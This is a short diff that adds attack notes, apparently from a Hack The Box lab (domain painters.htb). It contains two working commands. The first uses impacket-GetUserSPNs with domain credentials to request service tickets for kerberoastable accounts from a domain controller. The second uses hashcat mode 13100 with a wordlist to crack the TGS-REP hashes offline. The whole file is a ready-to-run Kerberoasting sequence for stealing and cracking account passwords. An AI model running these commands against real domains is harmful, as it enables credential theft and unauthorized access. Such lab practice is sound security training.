@@ -1,0 +1,5 @@
+# Get kerberoastable users
+impacket-GetUserSPNs painters.htb/riley:'password_here' -outputfile kerberoast.out -dc-ip 192.168.110.55
+
+# Crack TGS-REP hashes, straight mode, 2nd Device (GPU)
+hashcat -a 0 -m 13100 ./painters.htb.toroast ./weakpass_3a -o painters.htb.toroast.cracked.txt -D 2 -O
